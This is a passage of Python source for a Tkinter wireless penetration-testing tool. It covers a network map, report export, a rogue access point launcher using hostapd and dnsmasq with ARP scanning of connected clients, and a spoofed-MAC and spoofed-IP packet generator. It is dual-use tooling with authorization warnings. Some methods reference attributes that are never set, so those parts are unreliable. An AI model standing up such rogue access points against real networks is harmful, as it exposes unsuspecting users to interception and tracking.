            filetypes=[("Edge List Files", "*.txt *.edgelist"), ("All Files", "*.*")]
        )
        if file_path:
            try:
                # Load graph from an edge list file
                self.G = nx.read_edgelist(file_path)
                messagebox.showinfo("Success", f"Graph loaded from {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to load graph:\n{e}")

    def plot_graph(self):
        if not self.G.nodes:
            messagebox.showwarning("Warning", "Graph is empty. Load a graph first.")
            return

        try:
            self.ax.clear()
            self.ax.set_title("Network Graph Visualization")
            self.ax.axis('off')  # Hide axes

            # Define layout for nodes
            pos = nx.spring_layout(self.G)

            # Draw nodes and edges
            nx.draw_networkx_nodes(self.G, pos, ax=self.ax, node_size=300, node_color='skyblue')
            nx.draw_networkx_edges(self.G, pos, ax=self.ax, width=1.0, alpha=0.7)
            nx.draw_networkx_labels(self.G, pos, ax=self.ax, font_size=10)

            self.canvas.draw()
        except Exception as e:
            messagebox.showerror("Error", f"Failed to plot graph:\n{e}")


# ui/frames/network_map.py
# ui/frames/network_map_frame.py

"""
NetworkMapFrame Module

This module defines the NetworkMapFrame class, a subclass of BaseFrame, which provides
graphical representations of discovered networks, devices, and their interconnections.
It utilizes NetworkX for graph management and Matplotlib for visualization, embedded within
a Tkinter GUI.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized
access to networks is illegal and unethical.
"""

import tkinter as tk
from tkinter import ttk
from tkinter import messagebox
from typing import Optional, Dict, Any

import networkx as nx
import matplotlib.pyplot as plt
from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
from matplotlib.figure import Figure

from ui.frames.base_frame import BaseFrame  # Assuming BaseFrame is in ui/base_frame.py


class NetworkMapFrame(BaseFrame):
    """
    Frame for visualizing network topology, including networks, devices, and their interconnections.

    Attributes:
        graph (nx.Graph): NetworkX graph representing the network topology.
        figure (Figure): Matplotlib figure for plotting the graph.
        canvas (FigureCanvasTkAgg): Canvas widget to embed the Matplotlib figure into Tkinter.
    """

    def __init__(self, parent, **kwargs):
        """
        Initializes the NetworkMapFrame.

        Args:
            parent (ttk.Notebook): The parent Notebook widget to attach the frame.
            core_framework (Any): Instance of CoreFramework for accessing network data.
            **kwargs: Additional keyword arguments for the BaseFrame.
        """
        super().__init__(parent, **kwargs)
        self.parent = parent


        # Initialize the NetworkX graph
        self.graph: nx.Graph = nx.Graph()

        # Set up the GUI components
        self.create_widgets()

        # Initial load of network data
        self.load_network_data()

    def create_widgets(self):
        """
        Creates and arranges all GUI components within the NetworkMapFrame.
        """
        # Frame for controls (e.g., Refresh Button)
        controls_frame = ttk.Frame(self)
        controls_frame.pack(fill=tk.X, padx=10, pady=5)

        # Refresh Button
        refresh_button = ttk.Button(controls_frame, text="Refresh Network Map", command=self.refresh_network_map)
        refresh_button.pack(side=tk.LEFT, padx=5)

        # Instructions Label
        instructions = ttk.Label(controls_frame, text="Click on a node to view details.")
        instructions.pack(side=tk.LEFT, padx=10)

        # Frame for the network graph
        graph_frame = ttk.Frame(self)
        graph_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Initialize Matplotlib Figure
        self.figure: Figure = Figure(figsize=(8, 6), dpi=100)
        self.ax = self.figure.add_subplot(111)
        self.ax.axis('off')  # Hide axes

        # Create a canvas to embed the Matplotlib figure
        self.canvas: FigureCanvasTkAgg = FigureCanvasTkAgg(self.figure, master=graph_frame)
        self.canvas.draw()
        self.canvas.get_tk_widget().pack(fill=tk.BOTH, expand=True)

        # Bind click event to the canvas
        self.canvas.mpl_connect("button_press_event", self.on_click)

    def load_network_data(self):
        """
        Loads network data from the CoreFramework and updates the graph visualization.
        """
        try:
            # Fetch network data from CoreFramework
            network_data = self.core_framework.get_network_data()  # Method to retrieve network info
            self.update_graph(network_data)
        except Exception as e:
            messagebox.showerror("Data Load Error", f"Failed to load network data: {e}")

    def refresh_network_map(self):
        """
        Refreshes the network map by reloading network data and updating the visualization.
        """
        self.load_network_data()

    def update_graph(self, network_data: Dict[str, Any]):
        """
        Updates the NetworkX graph based on the provided network data.

        Args:
            network_data (Dict[str, Any]): Dictionary containing network and device information.
        """
        # Clear the existing graph
        self.graph.clear()

        # Example structure of network_data:
        # {
        #     "networks": [
        #         {
        #             "SSID": "Network1",
        #             "BSSID": "00:11:22:33:44:55",
        #             "Devices": [
        #                 {"MAC": "AA:BB:CC:DD:EE:FF", "IP": "192.168.1.2", "Hostname": "Device1"},
        #                 ...
        #             ]
        #         },
        #         ...
        #     ]
        # }

        networks = network_data.get("networks", [])
        for network in networks:
            ssid = network.get("SSID")
            bssid = network.get("BSSID")
            if ssid and bssid:
                # Add network node
                self.graph.add_node(bssid, label=ssid, type='network')

                devices = network.get("Devices", [])
                for device in devices:
                    mac = device.get("MAC")
                    ip = device.get("IP")
                    hostname = device.get("Hostname", "Unknown")
                    if mac:
                        # Add device node
                        self.graph.add_node(mac, label=f"{hostname}\n{ip}", type='device')
                        # Connect device to network
                        self.graph.add_edge(bssid, mac)

        # Draw the updated graph
        self.draw_graph()

    def draw_graph(self):
        """
        Draws the NetworkX graph on the Matplotlib figure.
        """
        self.ax.clear()
        self.ax.axis('off')  # Hide axes

        # Define node colors based on type
        node_colors = []
        for node, data in self.graph.nodes(data=True):
            if data.get('type') == 'network':
                node_colors.append('lightblue')
            elif data.get('type') == 'device':
                node_colors.append('lightgreen')
            else:
                node_colors.append('gray')

        # Define node sizes
        node_sizes = [800 if data.get('type') == 'network' else 500 for node, data in self.graph.nodes(data=True)]

        # Define labels
        labels = {node: data.get('label', node) for node, data in self.graph.nodes(data=True)}

        # Compute layout
        pos = nx.spring_layout(self.graph, k=0.5, iterations=50)

        # Draw nodes
        nx.draw_networkx_nodes(self.graph, pos, node_size=node_sizes, node_color=node_colors, ax=self.ax)

        # Draw edges
        nx.draw_networkx_edges(self.graph, pos, ax=self.ax)

        # Draw labels
        nx.draw_networkx_labels(self.graph, pos, labels, font_size=8, ax=self.ax)

        # Refresh the canvas
        self.canvas.draw()

    def on_click(self, event):
        """
        Handles click events on the network graph.

        Args:
            event: Matplotlib event object containing event information.
        """
        # Check if the click was on a node
        if event.inaxes == self.ax:
            # Get the closest node to the click
            x_click, y_click = event.xdata, event.ydata
            closest_node = self.get_closest_node(x_click, y_click)
            if closest_node:
                self.show_node_details(closest_node)

    def get_closest_node(self, x: float, y: float) -> Optional[str]:
        """
        Finds the closest node in the graph to the given x and y coordinates.

        Args:
            x (float): X-coordinate of the click.
            y (float): Y-coordinate of the click.

        Returns:
            Optional[str]: The node identifier if a close node is found, else None.
        """
        threshold = 0.05  # Distance threshold for selecting a node
        closest_node = None
        min_distance = float('inf')

        for node, data in self.graph.nodes(data=True):
            pos = self.graph.nodes[node].get('pos', None)
            if pos is None:
                continue
            dx = x - pos[0]
            dy = y - pos[1]
            distance = dx**2 + dy**2
            if distance < min_distance and distance < threshold**2:
                min_distance = distance
                closest_node = node

        return closest_node

    def show_node_details(self, node: str):
        """
        Displays a popup window with details about the selected node.

        Args:
            node (str): The node identifier.
        """
        node_data = self.graph.nodes[node]
        label = node_data.get('label', 'N/A')
        node_type = node_data.get('type', 'Unknown')

        # Fetch additional details if available
        details = ""
        if node_type == 'network':
            details += f"Network SSID: {label}\n"
            details += f"BSSID: {node}\n"
            # Add more network-specific details if available
        elif node_type == 'device':
            details += f"Device Name: {label.splitlines()[0]}\n"
            details += f"IP Address: {label.splitlines()[1] if len(label.splitlines()) > 1 else 'N/A'}\n"
            details += f"MAC Address: {node}\n"
            # Add more device-specific details if available

        # Create a popup window
        popup = tk.Toplevel(self)
        popup.title(f"Details for {node}")
        popup.geometry("300x200")
        ttk.Label(popup, text=f"Node: {node}", font=("Helvetica", 12, "bold")).pack(pady=10)
        ttk.Label(popup, text=details, justify='left').pack(padx=10, pady=10)
        ttk.Button(popup, text="Close", command=popup.destroy).pack(pady=10)

        # Make the popup modal
        popup.transient(self)
        popup.grab_set()
        self.wait_window(popup)


# ui/base_frame.py

"""
BaseFrame Module

This module defines the BaseFrame class, a subclass of ttk.Frame, which serves as a base
for all other frames in the WirelessPenTestLib GUI. It provides common functionalities
and a consistent structure for derived frames.

** Important Note:**
Creating rogue access points and performing network penetration testing should only be done
with explicit permission on networks you own or have authorization to test. Unauthorized
access to networks is illegal and unethical.
"""

import tkinter as tk
from tkinter import ttk
from typing import Any


class BaseFrame(ttk.Frame):
    """
    BaseFrame class serving as the parent for all other frames in the GUI.

    Attributes:
        parent (ttk.Widget): The parent widget.
    """

    def __init__(self, parent: ttk.Widget, *args, **kwargs):
        """
        Initializes the BaseFrame.

        Args:
            parent (ttk.Widget): The parent widget.
            *args: Variable length argument list.
            **kwargs: Arbitrary keyword arguments.
        """
        super().__init__(parent, *args, **kwargs)
        self.parent = parent


# ui/frames/report_generation_frame.py
# ui/frames/report_generation_frame.py

import tkinter as tk
from tkinter import ttk, filedialog, messagebox
from core import CoreFramework
from core import CoreFramework

class ReportGenerationFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        # Generate Report Button
        generate_button = ttk.Button(self, text="Generate Detailed Report", command=self.generate_report)
        generate_button.pack(pady=20)

    def generate_report(self):
        # Fetch scan and exploit results from CoreFramework
        scan_results = self.core.get_scan_results()
        exploit_results = self.core.get_exploit_results()
        report_data = self.core.get_additional_report_data()

        # Ask user for export format
        export_format = tk.StringVar(value='pdf')
        format_window = tk.Toplevel(self)
        format_window.title("Select Export Format")
        ttk.Label(format_window, text="Choose Report Format:").pack(padx=10, pady=10)
        format_combo = ttk.Combobox(format_window, textvariable=export_format, state='readonly')
        format_combo['values'] = ['pdf', 'json', 'csv']
        format_combo.pack(padx=10, pady=5)
        format_combo.current(0)

        def confirm_export():
            selected_format = export_format.get()
            file_types = {
                'pdf': [('PDF Files', '*.pdf')],
                'json': [('JSON Files', '*.json')],
                'csv': [('CSV Files', '*.csv')]
            }
            file_path = filedialog.asksaveasfilename(defaultextension=f".{selected_format}",
                                                     filetypes=file_types[selected_format])
            if file_path:
                try:
                    self.core.generate_detailed_report(scan_results, exploit_results, report_data, selected_format, file_path)
                    messagebox.showinfo("Export Successful", f"Report exported to {file_path}")
                except Exception as e:
                    messagebox.showerror("Export Error", f"Failed to export report: {e}")
            format_window.destroy()

        ttk.Button(format_window, text="Export", command=confirm_export).pack(pady=10)


# ui/frames/rogue_access_point.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

import threading
import time
import subprocess
import re
import os
import sys
from scapy.all import srp
from scapy.layers.l2 import ARP, Ether


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class FakeAccessPoint(BaseFrame):
    """
    Frame for creating and managing a fake (rogue) access point and monitoring connected devices.
    """
    def __init__(self, parent):
        """
        Initializes the FakeAccessPoint.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.ap_running = False
        self.monitor_thread = None
        self.scan_thread = None
        self.stop_event = threading.Event()

        # Path to hostapd and dnsmasq configuration files
        self.hostapd_conf_path = "/tmp/hostapd.conf"
        self.dnsmasq_conf_path = "/tmp/dnsmasq.conf"

        # Wireless interface (default)
        self.interface = "wlan0"

        # List to store connected devices
        self.connected_devices = []

        # Create GUI components
        self.create_widgets()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Configuration Frame
        config_frame = ttk.LabelFrame(self, text="Access Point Configuration")
        config_frame.pack(fill=tk.X, padx=10, pady=5)

        # SSID
        ttk.Label(config_frame, text="SSID:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.E)
        self.ssid_var = StringVar()
        self.ssid_entry = ttk.Entry(config_frame, textvariable=self.ssid_var)
        self.ssid_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.ssid_entry.insert(0, "TestAP")

        # Channel
        ttk.Label(config_frame, text="Channel:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.E)
        self.channel_var = StringVar()
        self.channel_entry = ttk.Entry(config_frame, textvariable=self.channel_var)
        self.channel_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.channel_entry.insert(0, "6")

        # Interface
        ttk.Label(config_frame, text="Interface:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.E)
        self.interface_var = StringVar()
        self.interface_entry = ttk.Entry(config_frame, textvariable=self.interface_var)
        self.interface_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
        self.interface_entry.insert(0, self.interface)

        # Security
        ttk.Label(config_frame, text="Security:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.E)
        self.security_var = StringVar()
        self.security_combo = ttk.Combobox(config_frame, textvariable=self.security_var, state="readonly")
        self.security_combo['values'] = ("Open", "WPA/WPA2")
        self.security_combo.current(0)
        self.security_combo.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)
        self.security_combo.bind("<<ComboboxSelected>>", self.toggle_password)

        # Password
        ttk.Label(config_frame, text="Password:").grid(row=4, column=0, padx=5, pady=5, sticky=tk.E)
        self.password_var = StringVar()
        self.password_entry = ttk.Entry(config_frame, textvariable=self.password_var, show="*")
        self.password_entry.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
        self.password_entry.configure(state='disabled')

        # Buttons Frame
        buttons_frame = ttk.Frame(self)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)

        # Start AP Button
        self.start_ap_button = ttk.Button(buttons_frame, text="Start AP", command=self.start_ap)
        self.start_ap_button.pack(side=tk.LEFT, padx=5)

        # Stop AP Button
        self.stop_ap_button = ttk.Button(buttons_frame, text="Stop AP", command=self.stop_ap, state=tk.DISABLED)
        self.stop_ap_button.pack(side=tk.LEFT, padx=5)

        # Refresh Devices Button
        self.refresh_button = ttk.Button(buttons_frame, text="Refresh Devices", command=self.refresh_devices, state=tk.DISABLED)
        self.refresh_button.pack(side=tk.LEFT, padx=5)

        # Devices Frame
        devices_frame = ttk.LabelFrame(self, text="Connected Devices")
        devices_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Treeview for devices
        columns = ("MAC Address", "IP Address", "Signal Strength")
        self.devices_tree = ttk.Treeview(devices_frame, columns=columns, show="headings")
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, anchor=tk.W, stretch=True)
        self.devices_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbar for Treeview
        devices_vsb = ttk.Scrollbar(devices_frame, orient=VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscroll=devices_vsb.set)
        devices_vsb.pack(side=tk.RIGHT, fill=tk.Y)

    def toggle_password(self, event):
        """
        Enables or disables the password entry based on selected security.
        """
        if self.security_var.get() == "WPA/WPA2":
            self.password_entry.configure(state='normal')
        else:
            self.password_entry.configure(state='disabled')
            self.password_var.set("")

    def start_ap(self):
        """
        Starts the rogue access point.
        """
        ssid = self.ssid_var.get().strip()
        channel = self.channel_var.get().strip()
        interface = self.interface_var.get().strip()
        security = self.security_var.get().strip()
        password = self.password_var.get().strip()

        # Validate inputs
        if not ssid:
            messagebox.showerror("Input Error", "SSID is required.")
            return
        if not channel.isdigit() or not (1 <= int(channel) <= 14):
            messagebox.showerror("Input Error", "Channel must be a number between 1 and 14.")
            return
        if not self.validate_interface(interface):
            messagebox.showerror("Input Error", f"Interface '{interface}' is not valid or not up.")
            return
        if security == "WPA/WPA2" and not password:
            messagebox.showerror("Input Error", "Password is required for WPA/WPA2 security.")
            return
        if security == "WPA/WPA2" and len(password) < 8:
            messagebox.showerror("Input Error", "Password must be at least 8 characters long.")
            return

        # Generate hostapd configuration
        try:
            self.generate_hostapd_conf(ssid, channel, interface, security, password)
        except Exception as e:
            messagebox.showerror("Configuration Error", f"Failed to generate hostapd configuration:\n{e}")
            return

        # Start hostapd
        try:
            self.hostapd_process = subprocess.Popen(['hostapd', self.hostapd_conf_path],
                                                    stdout=subprocess.PIPE,
                                                    stderr=subprocess.PIPE)
        except FileNotFoundError:
            messagebox.showerror("hostapd Not Found", "hostapd is not installed or not found in PATH.")
            return
        except Exception as e:
            messagebox.showerror("hostapd Error", f"Failed to start hostapd:\n{e}")
            return

        # Start dnsmasq for DHCP (optional)
        try:
            self.generate_dnsmasq_conf(interface)
            self.dnsmasq_process = subprocess.Popen(['dnsmasq', '-C', self.dnsmasq_conf_path, '-d'],
                                                   stdout=subprocess.PIPE,
                                                   stderr=subprocess.PIPE)
        except FileNotFoundError:
            messagebox.showerror("dnsmasq Not Found", "dnsmasq is not installed or not found in PATH.")
            self.hostapd_process.terminate()
            return
        except Exception as e:
            messagebox.showerror("dnsmasq Error", f"Failed to start dnsmasq:\n{e}")
            self.hostapd_process.terminate()
            return

        self.ap_running = True
        self.start_ap_button.config(state=tk.DISABLED)
        self.stop_ap_button.config(state=tk.NORMAL)
        self.refresh_button.config(state=tk.NORMAL)

        # Start monitoring connected devices
        self.monitor_thread = threading.Thread(target=self.monitor_devices, daemon=True)
        self.monitor_thread.start()

        messagebox.showinfo("AP Started", f"Rogue Access Point '{ssid}' has been started on channel {channel}.")

    def stop_ap(self):
        """
        Stops the rogue access point.
        """
        if self.ap_running:
            # Terminate hostapd
            self.hostapd_process.terminate()
            self.hostapd_process.wait()

            # Terminate dnsmasq
            self.dnsmasq_process.terminate()
            self.dnsmasq_process.wait()

            # Remove temporary configuration files
            try:
                os.remove(self.hostapd_conf_path)
                os.remove(self.dnsmasq_conf_path)
            except Exception:
                pass

            # Stop device monitoring
            self.ap_running = False
            self.stop_event.set()
            if self.monitor_thread.is_alive():
                self.monitor_thread.join()

            # Clear devices list
            self.connected_devices.clear()
            self.devices_tree.delete(*self.devices_tree.get_children())

            self.start_ap_button.config(state=tk.NORMAL)
            self.stop_ap_button.config(state=tk.DISABLED)
            self.refresh_button.config(state=tk.DISABLED)

            messagebox.showinfo("AP Stopped", "Rogue Access Point has been stopped.")
        else:
            messagebox.showwarning("Not Running", "Access Point is not running.")

    def generate_hostapd_conf(self, ssid, channel, interface, security, password):
        """
        Generates the hostapd configuration file.
        """
        # Base configuration
        config = f"""
    interface={interface}
    driver=nl80211
    ssid={ssid}
    channel={channel}
    hw_mode=g
    ieee80211n=1
    wmm_enabled=1
        """

        # Add security configuration
        if security == "WPA/WPA2":
            config += f"""
    wpa=2
    wpa_passphrase={password}
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
            """
        else:
            config += """
    auth_algs=1
            """

        # Write the configuration to the file
        with open(self.hostapd_conf_path, 'w') as f:
            f.write(config)

    def generate_dnsmasq_conf(self, interface):
        """
        Generates the dnsmasq configuration file for DHCP services.
        """
        config = f"""
            interface={interface}
            dhcp-range=192.168.10.10,192.168.10.50,12h
            dhcp-option=3,192.168.10.1
            dhcp-option=6,192.168.10.1
            server=8.8.8.8
            log-queries
            log-dhcp
        """

        with open(self.dnsmasq_conf_path, 'w') as f:
            f.write(config)

    def validate_interface(self, interface):
        """
        Validates if the wireless interface exists and is up.
        """
        try:
            output = subprocess.check_output(['iwconfig', interface], stderr=subprocess.STDOUT).decode()
            if "no wireless extensions" in output.lower():
                return False
            return True
        except subprocess.CalledProcessError:
            return False

    def monitor_devices(self):
        """
        Monitors connected devices by periodically scanning the network.
        """
        while self.ap_running and not self.stop_event.is_set():
            devices = self.scan_connected_devices()
            self.update_device_list(devices)
            time.sleep(5)  # Adjust the scan interval as needed

    def scan_connected_devices(self):
        """
        Scans the network for connected devices using ARP.
        """
        # Assuming the AP is on 192.168.10.0/24
        target_ip = "192.168.10.0/24"

        # Construct ARP request
        arp = ARP(pdst=target_ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]

        devices = []
        for sent, received in result:
            devices.append({'mac': received.hwsrc, 'ip': received.psrc, 'signal': "N/A"})  # Signal strength can be added if available

        return devices

    def update_device_list(self, devices):
        """
        Updates the Treeview with the list of connected devices.
        """
        # Clear existing entries
        self.devices_tree.delete(*self.devices_tree.get_children())

        for device in devices:
            self.devices_tree.insert("", "end", values=(
                device['mac'],
                device['ip'],
                device['signal']
            ))

    def refresh_devices(self):
        """
        Manually refreshes the list of connected devices.
        """
        if self.ap_running:
            devices = self.scan_connected_devices()
            self.update_device_list(devices)
        else:
            messagebox.showwarning("AP Not Running", "Access Point is not running.")

    def save_devices(self):
        """
        Saves the list of connected devices to a file.
        """
        if not self.connected_devices:
            messagebox.showwarning("No Devices", "There are no connected devices to save.")
            return

        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )

        if file_path:
            try:
                with open(file_path, 'w') as f:
                    for device in self.connected_devices:
                        f.write(f"MAC Address: {device['mac']}\n")
                        f.write(f"IP Address: {device['ip']}\n")
                        f.write(f"Signal Strength: {device['signal']}\n")
                        f.write("\n")
                messagebox.showinfo("Success", f"Connected devices saved to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to save devices:\n{e}")

    # Additional methods like view_device_info, export_device_info can be implemented here if needed


# Example usage within a Tkinter application
def main():
    root = tk.Tk()
    root.title("Network Testing Tool")
    root.geometry("800x600")

    # Create a Notebook (tabbed interface)
    notebook = ttk.Notebook(root)
    notebook.pack(fill=tk.BOTH, expand=True)

    # Add FakeAccessPoint tab
    fake_access_point = FakeAccessPoint(notebook)
    notebook.add(fake_access_point, text="Fake Access Point")

    root.mainloop()


if __name__ == "__main__":
    if os.geteuid() != 0:
        messagebox.showerror("Permission Denied", "Please run this script with sudo or as root.")
        sys.exit(1)
    main()


# ui/frames/signal_heatmap_frame.py
# ui/frames/signal_heatmap_frame.py

import tkinter as tk
from tkinter import ttk
from core import CoreFramework

class SignalHeatmapFrame(ttk.Frame):
    def __init__(self, parent, core_framework: CoreFramework):
        super().__init__(parent)
        self.core = core_framework
        self.create_widgets()

    def create_widgets(self):
        self.start_button = ttk.Button(self, text="Start Signal Capture", command=self.start_capture)
        self.start_button.pack(pady=10)

        self.stop_button = ttk.Button(self, text="Stop Capture", command=self.stop_capture)
        self.stop_button.pack(pady=10)

        self.generate_button = ttk.Button(self, text="Generate Heatmap", command=self.generate_heatmap)
        self.generate_button.pack(pady=10)

    def start_capture(self):
        self.core.start_signal_heatmap()

    def stop_capture(self):
        self.core.stop_event.set()

    def generate_heatmap(self):
        self.core.generate_heatmap()


# ui/frames/test_devices.py
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
from tkinter import StringVar, Text, Scrollbar, END, VERTICAL, HORIZONTAL, N, S, E, W

from scapy.all import send
from scapy.layers.inet import IP, TCP, UDP, ICMP
from scapy.layers.l2 import Ether
import threading
import time
import queue
import re


# Assuming BaseFrame is a subclass of ttk.Frame
class BaseFrame(ttk.Frame):
    def __init__(self, parent, *args, **kwargs):
        super().__init__(parent, *args, **kwargs)


class FakeDeviceManager(BaseFrame):
    """
    Frame for creating and managing fake test devices for network testing purposes.
    """
    def __init__(self, parent):
        """
        Initializes the FakeDeviceManager.
        """
        super().__init__(parent)
        self.parent = parent
        self.pack(fill=tk.BOTH, expand=True)

        # Initialize variables
        self.fake_devices = {}
        self.device_queue = queue.Queue()

        # Create GUI components
        self.create_widgets()

    def create_widgets(self):
        """
        Creates and arranges all GUI components.
        """
        # Input Frame
        input_frame = ttk.LabelFrame(self, text="Create Fake Device")
        input_frame.pack(fill=tk.X, padx=10, pady=5)

        # Device Name
        ttk.Label(input_frame, text="Device Name:").grid(row=0, column=0, padx=5, pady=5, sticky=tk.E)
        self.device_name_var = StringVar()
        self.device_name_entry = ttk.Entry(input_frame, textvariable=self.device_name_var)
        self.device_name_entry.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        # MAC Address
        ttk.Label(input_frame, text="MAC Address:").grid(row=1, column=0, padx=5, pady=5, sticky=tk.E)
        self.mac_address_var = StringVar()
        self.mac_address_entry = ttk.Entry(input_frame, textvariable=self.mac_address_var)
        self.mac_address_entry.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)
        self.mac_address_entry.insert(0, "00:11:22:33:44:55")  # Default MAC

        # IP Address
        ttk.Label(input_frame, text="IP Address:").grid(row=2, column=0, padx=5, pady=5, sticky=tk.E)
        self.ip_address_var = StringVar()
        self.ip_address_entry = ttk.Entry(input_frame, textvariable=self.ip_address_var)
        self.ip_address_entry.grid(row=2, column=1, padx=5, pady=5, sticky=tk.W)
        self.ip_address_entry.insert(0, "192.168.1.100")  # Default IP

        # Protocol
        ttk.Label(input_frame, text="Protocol:").grid(row=3, column=0, padx=5, pady=5, sticky=tk.E)
        self.protocol_var = StringVar()
        self.protocol_combo = ttk.Combobox(input_frame, textvariable=self.protocol_var, state="readonly")
        self.protocol_combo['values'] = ("TCP", "UDP", "ICMP")
        self.protocol_combo.current(0)
        self.protocol_combo.grid(row=3, column=1, padx=5, pady=5, sticky=tk.W)

        # Destination IP
        ttk.Label(input_frame, text="Destination IP:").grid(row=4, column=0, padx=5, pady=5, sticky=tk.E)
        self.dest_ip_var = StringVar()
        self.dest_ip_entry = ttk.Entry(input_frame, textvariable=self.dest_ip_var)
        self.dest_ip_entry.grid(row=4, column=1, padx=5, pady=5, sticky=tk.W)
        self.dest_ip_entry.insert(0, "192.168.1.1")  # Default Destination IP

        # Destination Port (for TCP/UDP)
        ttk.Label(input_frame, text="Destination Port:").grid(row=5, column=0, padx=5, pady=5, sticky=tk.E)
        self.dest_port_var = StringVar()
        self.dest_port_entry = ttk.Entry(input_frame, textvariable=self.dest_port_var)
        self.dest_port_entry.grid(row=5, column=1, padx=5, pady=5, sticky=tk.W)
        self.dest_port_entry.insert(0, "80")  # Default Port

        # Create Device Button
        self.create_button = ttk.Button(input_frame, text="Add Device", command=self.add_fake_device)
        self.create_button.grid(row=6, column=0, columnspan=2, pady=10)

        # Separator
        separator = ttk.Separator(self, orient='horizontal')
        separator.pack(fill=tk.X, padx=10, pady=10)

        # Devices Frame
        devices_frame = ttk.LabelFrame(self, text="Fake Devices")
        devices_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)

        # Treeview for devices
        columns = ("Device Name", "MAC Address", "IP Address", "Protocol", "Destination IP", "Destination Port", "Status")
        self.devices_tree = ttk.Treeview(devices_frame, columns=columns, show="headings", selectmode="browse")
        for col in columns:
            self.devices_tree.heading(col, text=col)
            self.devices_tree.column(col, anchor=tk.W, stretch=True)
        self.devices_tree.pack(fill=tk.BOTH, expand=True, side=tk.LEFT)

        # Scrollbars for Treeview
        devices_vsb = ttk.Scrollbar(devices_frame, orient=VERTICAL, command=self.devices_tree.yview)
        self.devices_tree.configure(yscroll=devices_vsb.set)
        devices_vsb.pack(side=tk.RIGHT, fill=tk.Y)

        # Buttons Frame
        buttons_frame = ttk.Frame(self)
        buttons_frame.pack(fill=tk.X, padx=10, pady=5)

        # Start Emulation Button
        self.start_emulation_button = ttk.Button(buttons_frame, text="Start Emulation", command=self.start_emulation)
        self.start_emulation_button.pack(side=tk.LEFT, padx=5)

        # Stop Emulation Button
        self.stop_emulation_button = ttk.Button(buttons_frame, text="Stop Emulation", command=self.stop_emulation, state=tk.DISABLED)
        self.stop_emulation_button.pack(side=tk.LEFT, padx=5)

        # Remove Device Button
        self.remove_button = ttk.Button(buttons_frame, text="Remove Device", command=self.remove_fake_device)
        self.remove_button.pack(side=tk.LEFT, padx=5)

    def validate_mac(self, mac):
        """
        Validates MAC address format.
        """
        if re.match("[0-9a-fA-F]{2}([-:])[0-9a-fA-F]{2}(\\1[0-9a-fA-F]{2}){4}$", mac):
            return True
        return False

    def validate_ip(self, ip):
        """
        Validates IP address format.
        """
        parts = ip.split(".")
        if len(parts) != 4:
            return False
        for item in parts:
            if not item.isdigit():
                return False
            num = int(item)
            if num < 0 or num > 255:
                return False
        return True

    def add_fake_device(self):
        """
        Adds a new fake device based on input fields.
        """
        device_name = self.device_name_var.get().strip()
        mac_address = self.mac_address_var.get().strip()
        ip_address = self.ip_address_var.get().strip()
        protocol = self.protocol_var.get().strip().upper()
        dest_ip = self.dest_ip_var.get().strip()
        dest_port = self.dest_port_var.get().strip()

        # Validate inputs
        if not device_name:
            messagebox.showerror("Input Error", "Device Name is required.")
            return

        if not self.validate_mac(mac_address):
            messagebox.showerror("Input Error", "Invalid MAC Address format.")
            return

        if not self.validate_ip(ip_address):
            messagebox.showerror("Input Error", "Invalid IP Address format.")
            return

        if protocol not in ("TCP", "UDP", "ICMP"):
            messagebox.showerror("Input Error", "Protocol must be TCP, UDP, or ICMP.")
            return

        if not self.validate_ip(dest_ip):
            messagebox.showerror("Input Error", "Invalid Destination IP Address format.")
            return

        if protocol in ("TCP", "UDP"):
            if not dest_port.isdigit() or not (0 < int(dest_port) < 65536):
                messagebox.showerror("Input Error", "Destination Port must be a number between 1 and 65535.")
                return
            dest_port = int(dest_port)
        else:
            dest_port = "N/A"

        if device_name in self.fake_devices:
            messagebox.showerror("Duplicate Device", "A device with this name already exists.")
            return

        # Add device to Treeview
        status = "Stopped"
        self.devices_tree.insert("", "end", iid=device_name, values=(
            device_name,
            mac_address,
            ip_address,
            protocol,
            dest_ip,
            dest_port,
            status
        ))

        # Store device information
        self.fake_devices[device_name] = {
            'mac': mac_address,
            'ip': ip_address,
            'protocol': protocol,
            'dest_ip': dest_ip,
            'dest_port': dest_port,
            'status': status,
            'thread': None,
            'stop_event': None
        }

        # Clear input fields
        self.device_name_var.set("")
        self.mac_address_var.set("00:11:22:33:44:55")
